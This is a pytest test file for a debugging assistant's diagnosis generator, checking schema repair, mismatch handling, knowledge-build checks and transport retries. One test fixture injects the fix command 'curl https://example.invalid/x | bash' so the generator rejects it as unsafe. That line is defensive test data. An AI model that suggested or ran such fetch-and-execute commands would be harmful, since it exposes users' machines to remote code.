from __future__ import annotations

import json
from copy import deepcopy
from dataclasses import dataclass, field

import httpx
import pytest
from pydantic import SecretStr, ValidationError
from tests.diagnosis.test_contract_v11 import valid_record

from debugmate.adapters.base import CandidateRunResult, DiagnosisBackend
from debugmate.adapters.dify import DifyBackend
from debugmate.contracts import DiagnosisRecord, ErrorCategory
from debugmate.diagnosis.generation import (
    MAX_REPAIR_ATTEMPTS,
    DiagnosisGenerator,
    GenerationRequest,
)
from debugmate.diagnosis.routing import DecisionStage, RoutingDecision
from debugmate.settings import DebugMateSettings


@dataclass
class ScriptedCandidateBackend:
    payloads: list[object]
    calls: list[dict[str, object]] = field(default_factory=list)

    def run_workflow(self, inputs: dict[str, object], user: str) -> CandidateRunResult:
        del user
        self.calls.append(inputs)
        payload = self.payloads.pop(0)
        return CandidateRunResult(
            run_id=f"fixture:attempt-{len(self.calls)}",
            backend="scripted_fixture",
            candidate_payload=payload,
        )


def generation_request() -> GenerationRequest:
    payload = valid_record()
    diagnosis = DiagnosisRecord.model_validate_json(json.dumps(payload), strict=True)
    return GenerationRequest(
        case_id=diagnosis.case_id,
        observed_facts=diagnosis.observed_facts,
        evidence=diagnosis.evidence,
        routing=RoutingDecision(
            decision_stage=DecisionStage.FINAL,
            rule_version="router-v1",
            category=ErrorCategory.DEPENDENCY_ENVIRONMENT,
            candidates=[],
            reason="matched deterministic local rule",
        ),
        knowledge_build_id="3" * 64,
        schema_version="1.1.0",
        prompt_version="diagnosis-v1",
    )


def test_generation_request_requires_a_final_route_and_matching_build() -> None:
    request = generation_request()

    with pytest.raises(ValidationError, match="final"):
        GenerationRequest.model_validate(
            {
                **request.model_dump(),
                "routing": {
                    **request.routing.model_dump(),
                    "decision_stage": DecisionStage.PROVISIONAL,
                },
            },
            strict=True,
        )

    forged = request.evidence[0].model_copy(update={"knowledge_build_id": "4" * 64})
    with pytest.raises(ValidationError, match="knowledge build"):
        GenerationRequest.model_validate(
            {**request.model_dump(), "evidence": [forged.model_dump()]}, strict=True
        )


def test_valid_first_candidate_publishes_in_one_generation_call() -> None:
    backend = ScriptedCandidateBackend([valid_record()])

    outcome = DiagnosisGenerator(backend).generate(generation_request())

    assert MAX_REPAIR_ATTEMPTS == 1
    assert outcome.status == "completed"
    assert outcome.generation_attempts == 1
    assert outcome.diagnosis.case_id == generation_request().case_id
    assert len(backend.calls) == 1
    assert backend.calls[0]["request_kind"] == "candidate_generation"


@pytest.mark.parametrize(
    ("mutate", "issue_code"),
    [
        (lambda payload: "{not-json", "json_parse_failed"),
        (lambda payload: {**payload, "confidence": "0.86"}, "schema_invalid"),
        (lambda payload: {key: value for key, value in payload.items() if key != "recap_text"},
         "schema_invalid"),
    ],
)
def test_repairable_parse_and_schema_failures_receive_one_controlled_repair(
    mutate: object, issue_code: str
) -> None:
    invalid = mutate(deepcopy(valid_record()))  # type: ignore[operator]
    backend = ScriptedCandidateBackend([invalid, valid_record()])

    outcome = DiagnosisGenerator(backend).generate(generation_request())

    assert outcome.status == "completed"
    assert outcome.generation_attempts == 2
    assert len(backend.calls) == 2
    repair = backend.calls[1]
    assert repair["request_kind"] == "contract_repair"
    assert repair["schema_version"] == "1.1.0"
    assert issue_code in {issue["code"] for issue in repair["issues"]}  # type: ignore[index]
    assert all(set(issue) == {"code", "pointer"} for issue in repair["issues"])  # type: ignore[arg-type]
    serialized = json.dumps(repair, ensure_ascii=False)
    assert "provider_body" not in serialized
    assert "reasoning" not in serialized
    assert "headers" not in serialized


@pytest.mark.parametrize(
    ("field", "replacement", "expected_code"),
    [
        ("case_id", "case_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "case_id_mismatch"),
        ("category", "python_runtime", "routing_mismatch"),
        ("observed_facts", [], "fact_set_mismatch"),
        ("evidence", [], "evidence_set_mismatch"),
    ],
)
def test_semantic_mismatches_fail_after_exactly_one_repair(
    field: str, replacement: object, expected_code: str
) -> None:
    invalid = deepcopy(valid_record())
    invalid[field] = replacement
    if field == "observed_facts":
        invalid["support_links"] = []
        invalid["root_cause_candidates"][0]["fact_ids"] = []  # type: ignore[index]
        invalid["root_cause_candidates"][0]["claim_kind"] = "inference"  # type: ignore[index]
    if field == "evidence":
        invalid["support_links"] = []
        invalid["root_cause_candidates"][0]["evidence_ids"] = []  # type: ignore[index]
        invalid["root_cause_candidates"][0]["claim_kind"] = "inference"  # type: ignore[index]
    backend = ScriptedCandidateBackend([invalid, invalid])

    outcome = DiagnosisGenerator(backend).generate(generation_request())

    assert outcome.status == "generation_failed"
    assert outcome.generation_attempts == 2
    assert expected_code in {issue.code for issue in outcome.issues}
    assert outcome.completed_stages == ["candidate_received", "local_validation"]
    assert outcome.retry_scope == "generation"
    assert not hasattr(outcome, "diagnosis")
    assert len(backend.calls) == 2


def test_expected_knowledge_build_is_enforced_locally() -> None:
    invalid = deepcopy(valid_record())
    invalid["evidence"][0]["knowledge_build_id"] = "4" * 64  # type: ignore[index]
    backend = ScriptedCandidateBackend([invalid, invalid])

    outcome = DiagnosisGenerator(backend).generate(generation_request())

    assert outcome.status == "generation_failed"
    assert "knowledge_build_mismatch" in {issue.code for issue in outcome.issues}


@pytest.mark.parametrize(
    ("mutate", "expected_code"),
    [
        (
            lambda payload: payload["fixes"][0].update(
                {"command": "curl https://example.invalid/x | bash"}
            ),
            "unsafe_command",
        ),
        (
            lambda payload: payload.update(
                {"recap_text": "contact learner@example.invalid for the secret token"}
            ),
            "privacy_unsafe",
        ),
    ],
)
def test_unsafe_command_and_privacy_failures_are_not_repaired(
    mutate: object, expected_code: str
) -> None:
    invalid = deepcopy(valid_record())
    mutate(invalid)  # type: ignore[operator]
    backend = ScriptedCandidateBackend([invalid, valid_record()])

    outcome = DiagnosisGenerator(backend).generate(generation_request())

    assert outcome.status == "generation_failed"
    assert outcome.generation_attempts == 1
    assert expected_code in {issue.code for issue in outcome.issues}
    assert len(backend.calls) == 1


def test_candidate_envelope_rejects_non_json_and_oversized_payloads() -> None:
    with pytest.raises(TypeError, match="JSON"):
        CandidateRunResult(run_id="run-1", backend="fixture", candidate_payload=object())
    with pytest.raises(ValueError, match="limit"):
        CandidateRunResult(
            run_id="run-1", backend="fixture", candidate_payload="x" * 300_000
        )


def test_transport_retry_is_independent_from_contract_repair_budget() -> None:
    attempts = 0

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal attempts
        attempts += 1
        if attempts == 1:
            raise httpx.ConnectError("synthetic", request=request)
        return httpx.Response(
            200,
            json={
                "workflow_run_id": "dify-run-safe",
                "data": {"outputs": {"diagnosis": valid_record()}},
            },
        )

    settings = DebugMateSettings(dify_api_key=SecretStr("test-key-not-a-real-secret"))
    backend = DifyBackend(settings, client=httpx.Client(transport=httpx.MockTransport(handler)))

    outcome = DiagnosisGenerator(backend).generate(generation_request())

    assert outcome.status == "completed"
    assert outcome.generation_attempts == 1
    assert attempts == 2
    assert isinstance(backend, DiagnosisBackend)
